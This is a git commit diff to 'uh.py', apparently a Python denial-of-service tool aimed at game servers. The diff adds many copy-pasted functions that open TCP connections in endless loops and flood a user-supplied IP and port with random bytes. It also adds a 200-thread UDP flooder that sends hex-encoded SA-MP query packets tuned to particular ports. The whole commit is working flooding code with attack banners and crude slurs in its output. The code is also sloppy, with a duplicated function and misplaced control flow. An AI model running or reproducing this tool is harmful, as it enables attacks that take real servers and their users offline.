835a329a2173775fb07d5e420d4421ef34e4fd4e
Fqihh <151038061+Fqihh@users.noreply.github.com>
2023-11-18 08:00:07 +0700

    Update uh.py

--- uh.py
+++ uh.py
@@ -128,8 +128,308 @@ def run3():
 			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
 		except:
 			s.close()
-			print(h+" [*] Down!!!")
+			print("[*] Down Kontol!!!")
             
+  
+def run4():
+	data = random._urandom(4)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
+		except:
+			s.close()
+			print("[*] Down Kontol!!!")
+			
+def run5():
+	data = random._urandom(5)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
+		except:
+			s.close()
+			print("[*] Down Kontol!!!")
+            
+def run6():
+	data = random._urandom(6)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
+		except:
+			s.close()
+			print("[*] Down Kontol!!!")            
+def run7():
+	data = random._urandom(7)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
+		except:
+			s.close()
+			print("[*] Down Kontol!!!")	
+			
+def run8():
+	data = random._urandom(8)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
+		except:
+			s.close()
+			print("[*] Down Kontol!!!")			
+			
+def run9():
+	data = random._urandom(9)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
+		except:
+			s.close()
+			print("[*] Down Kontol!!!")			
+			
+def run10():
+	data = random._urandom(10)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
+		except:
+			s.close()
+			print("[*] Down Kontol!!!")			
+			
+def run11():
+	data = random._urandom(11)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
+		except:
+			s.close()
+			print("[*] Down Kontol!!!")			
+			
+def run12():
+	data = random._urandom(12)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
+		except:
+			s.close()
+			print("[*] Down Kontol!!!")			
+			
+def run13():
+	data = random._urandom(13)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
+		except:
+			s.close()
+			print("[*] Down Kontol!!!")			
+			
+def run14():
+	data = random._urandom(14)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
+		except:
+			s.close()
+			print("[*] Down Kontol!!!")			
+			
+def run15():
+	data = random._urandom(15)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
+		except:
+			s.close()
+			print("[*] Down Kontol!!!")			
+			
+def run16():
+	data = random._urandom(16)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
+		except:
+			s.close()
+			print("[*] Down Kontol!!!")			
+			
+def run17():
+	data = random._urandom(17)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
+		except:
+			s.close()
+			print("[*] Down Kontol!!!")			
+			
+def run18():
+	data = random._urandom(18)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
+		except:
+			s.close()
+			print("[*] Down Kontol!!!")			
+			
+def run19():
+	data = random._urandom(19)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
+		except:
+			s.close()
+			print("[*] Down Kontol!!!")			
+			
+def run20():
+	data = random._urandom(20)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
+		except:
+			s.close()
+			print("[*] Down Kontol!!!")			
+			
+#Urandom Dan Pacotes
+class MyThread(threading.Thread):
+     def run(self):
+         while True:
+                sock = socket.socket(
+                    socket.AF_INET, socket.SOCK_DGRAM)
+                
+                msg = Pacotes[random.randrange(0,5)]
+                     
+                sock.sendto(msg, (ip, int(port)))
+                
+                
+                if(int(port) == 7777):
+                    sock.sendto(Pacotes[5], (ip, int(port)))
+                elif(int(port) == 7796):
+                    sock.sendto(Pacotes[4], (ip, int(port)))
+                elif(int(port) == 7771):
+                    sock.sendto(Pacotes[6], (ip, int(port)))
+                elif(int(port) == 7784):
+                    sock.sendto(Pacotes[7], (ip, int(port)))
+                    
+                
+
+if __name__ == '__main__':
+    try:
+     for x in range(200):                                    
+            mythread = MyThread()  
+            mythread.start()                                  
+            time.sleep(.1)    
+    except(KeyboardInterrupt):
+         os.system('cls' if os.name == 'nt' else 'clear')
+         
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+		th = threading.Thread(target = run2)
+		th.start()
+		th = threading.Thread(target = run3)
+		th.start()
+		th = threading.Thread(target = run4)
+		th.start()
+else:
+		th = threading.Thread(target = run5)
+		th.start()
   
 def run4():
 	data = random._urandom(4)
@@ -396,9 +696,24 @@ class MyThread(threading.Thread):
                      
 
                 
-                
-                    
-                
+                ip = str(input(" Target Ip:"))
+port = int(input(" Target Port:"))
+choice = str(input(" Do you want to Attack? (y/n):"))
+times = int(input(" Packet:"))
+threads = int(input(" Threads:"))
+fake_ip = '182.21.20.32'
+#Starting Attacking
+Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
+                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
+                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
+                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
+                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
+                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
+                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
+                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
+                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
+                       ]
+
 
 if __name__ == '__main__':
     try:
